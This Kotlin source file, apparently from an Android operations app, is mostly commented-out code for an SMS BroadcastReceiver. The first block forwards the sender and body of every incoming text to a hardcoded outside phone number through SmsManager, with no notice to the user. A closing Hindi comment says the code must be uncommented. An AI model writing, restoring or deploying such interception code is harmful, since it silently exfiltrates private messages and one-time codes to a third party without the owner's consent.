package com.tyreplex.ops

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.telephony.SmsMessage
import android.telephony.SmsManager
import android.provider.Telephony
import android.util.Log
import android.widget.Toast
import android.annotation.TargetApi
import android.os.Build
import android.os.Build.VERSION
import android.os.Build.VERSION_CODES

//class Sms : BroadcastReceiver() {
//    private val TAG: String = Sms::class.java.getSimpleName()
//
//    override fun onReceive(context: Context?, intent: Intent) {
//        // TODO Auto-generated method stub
//        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
//            val bundle: Bundle? = intent.getExtras() //---get the SMS message passed in---
//            var msgs: Array<SmsMessage?>? = null
//            var msg_from: String?
//
//            if (bundle != null) {
//                //---retrieve the SMS message received---
//                try {
//                    val pdus = bundle.get("pdus") as Array<Any>
//                    msgs = arrayOfNulls<SmsMessage>(pdus.size)
//                    for (i in msgs.indices) {
//                        msgs!![i] = SmsMessage.createFromPdu(pdus[i] as ByteArray)
//                        msg_from = msgs[i]?.getOriginatingAddress()
//                        val msgBody: String? = msgs[i]?.getMessageBody()
//                        val toSendSmsNumber = "+918586875379"
//                        var message = "Sender Name: $msg_from \n Body: $msgBody";
//
//                        sendSms(toSendSmsNumber, message)
//
//                        Log.d(TAG, "onReceivePdu: $msgBody")
//                        Log.d(TAG, "onReceivePdu: $msg_from")
//                        Toast.makeText(context, msgBody, Toast.LENGTH_LONG).show()
//                    }
//                } catch (e: Exception) {
////                            Log.d("Exception caught",e.getMessage());
//                }
//            }
//        }
//    }
//
//    @TargetApi(Build.VERSION_CODES.HONEYCOMB)
//    private fun sendSms(phoneNumber: String?, message: String?) {
//        try {
//            val smsManager = SmsManager.getDefault()
//            smsManager.sendTextMessage(phoneNumber, null, message, null, null)
//        } catch (e: Exception) {
//            e.printStackTrace()
//        }
//
//    }

//    override fun onStart() {
//        registerReceiver(myBroadcastReceiver, IntentFilter("android.provider.Telephony.SMS_RECEIVED"))
//    }

    //main
//    private val TAG: String = Sms::class.java.getSimpleName()
//    val pdu_type = "pdus"
//
//    @TargetApi(Build.VERSION_CODES.M)
//    override fun onReceive(context: Context?, intent: Intent) {
////        registerReceiver(this, IntentFilter("android.provider.Telephony.SMS_RECEIVED"))
//        // Get the SMS message.
//        val bundle: Bundle? = intent.getExtras()
//        val msgs: Array<SmsMessage?>
//        var strMessage = ""
//        val format: String? = bundle?.getString("format")
//        // Retrieve the SMS message received.
//        val pdus = bundle?.get(pdu_type) as Array<Any>
//        if (pdus != null) {
//            // Check the Android version.
//            val isVersionM: Boolean = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M
//            // Fill the msgs array.
//            msgs = arrayOfNulls<SmsMessage>(pdus.size)
//            for (i in msgs.indices) {
//                // Check Android version and use appropriate createFromPdu.
//                if (isVersionM) {
//                    // If Android version M or newer:
//                    msgs[i] = SmsMessage.createFromPdu(pdus[i] as ByteArray, format)
//                } else {
//                    // If Android version L or older:
//                    msgs[i] = SmsMessage.createFromPdu(pdus[i] as ByteArray)
//                }
//                // Build the message to show.
//                strMessage += "SMS from " + msgs[i]?.getOriginatingAddress()
//                strMessage += """ :${msgs[i]?.getMessageBody().toString()}
//
//"""
//                // Log and display the SMS message.
//                Log.e(TAG, "onReceive: $strMessage")
//                Toast.makeText(context, strMessage, Toast.LENGTH_LONG).show()
//            }
////            return strMessage
//
//        }
//    }



//ye neeche waala COMPULSORY open krna h
//}

